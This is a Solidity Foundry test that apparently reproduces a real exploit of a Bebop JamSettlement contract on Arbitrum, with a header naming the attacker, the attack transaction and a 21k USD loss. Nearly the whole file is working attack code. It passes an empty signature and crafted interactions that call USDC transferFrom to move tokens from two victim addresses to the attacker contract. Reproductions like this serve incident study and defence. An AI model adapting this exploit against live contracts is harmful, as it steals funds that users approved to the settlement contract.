// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 21k USD
// Attacker : 0x59537353248d0b12c7fcca56a4e420ffec4abc91
// Attack Contract : 0x091101b0f31833c03dddd5b6411e62a212d05875
// Vulnerable Contract : 0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6
// Attack Tx : https://basescan.com/tx/0xe5f8fe69b38613a855dbcb499a2c4ecffe318c620a4c4117bd0e298213b7619d

// @Info
// Vulnerable Contract Code : https://basescan.com/address/0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6#code

// @Analysis
// Post-mortem : https://x.com/SuplabsYi/status/1955230173365961128
// Twitter Guy : https://x.com/SuplabsYi/status/1955230173365961128
// Hacking God : https://x.com/SuplabsYi/status/1955230173365961128
pragma solidity ^0.8.0;

struct JamOrder {
    address taker;
    address receiver;
    uint256 expiry;
    uint256 exclusivityDeadline;
    uint256 nonce;
    address executor;
    uint256 partnerInfo;
    address[] sellTokens;
    address[] buyTokens;
    uint256[] sellAmounts;
    uint256[] buyAmounts;
    bool usingPermit2;
}

struct JamInteraction {
    bool result;
    address to;
    uint256 value;
    bytes data;
}


contract Bebop is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 367586045 - 1;
     address private usdc = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    IJamSettlement jamContract = IJamSettlement(0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6);
    
    
    function setUp() public {
        vm.createSelectFork("arbitrum", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(usdc);
       
    }

    function testExploit() public balanceLog {
        // 1. Construct the JamOrder struct
        JamOrder memory order = JamOrder({
            taker: address(this),
            receiver: address(this),
            expiry: 1754987701,
            exclusivityDeadline: 0,
            nonce: 1,
            executor: address(this),
            partnerInfo: 0,
            sellTokens: new address[](0),
            buyTokens: new address[](0),
            sellAmounts: new uint256[](0),
            buyAmounts: new uint256[](0),
            usingPermit2: false
        });

         // 2. Define the signature (empty as provided)
        bytes memory signature = hex"";

            // Interaction 1 arguments
        address fromAddress1 = 0x0c06E0737e81666023bA2a4A10693e93277Cbbf1;
        uint256 amount1 = 0x4ac2def8f; // 20,134,500,015

        // Interaction 2 arguments
        address fromAddress2 = 0xe7Ee27D53578704825Cddd578cd1f15ea93eb6Fd;
        uint256 amount2 = 0xf4240; // 1,000,000

        // This 'to' address is the same in both interactions
        address sharedToAddress = address(this);

          // AFTER: Dynamically encode the call using the interface
        bytes memory interaction1Data = abi.encodeCall(
            IERC20.transferFrom, // The function pointer
            (fromAddress1, sharedToAddress, amount1) // The arguments as a tuple
        );

        bytes memory interaction2Data = abi.encodeCall(
            IERC20.transferFrom, // The function pointer
            (fromAddress2, sharedToAddress, amount2) // The arguments as a tuple
        );

        // 3. Construct the JamInteraction.Data array
        JamInteraction[] memory interactions = new JamInteraction[](2);

        interactions[0] = JamInteraction({
            result: false,
            to: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831,
            value: 0, 
            data: interaction1Data
        });

        interactions[1] = JamInteraction({
            result: false,
            to: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831,
            value: 0, 
            data: interaction2Data
        });

        // 4. Define the hooksData (empty as provided)
        bytes memory hooksData = hex"";

        // 5. Define the balanceRecipient
        address balanceRecipient = address(this);

        jamContract.settle(order, signature, interactions, hooksData, balanceRecipient);

    }
}

interface IJamSettlement {
    function settle(
        JamOrder calldata order,
        bytes calldata signature,
        JamInteraction[] calldata interactions,
        bytes memory hooksData,
        address balanceRecipient
    ) external payable;
}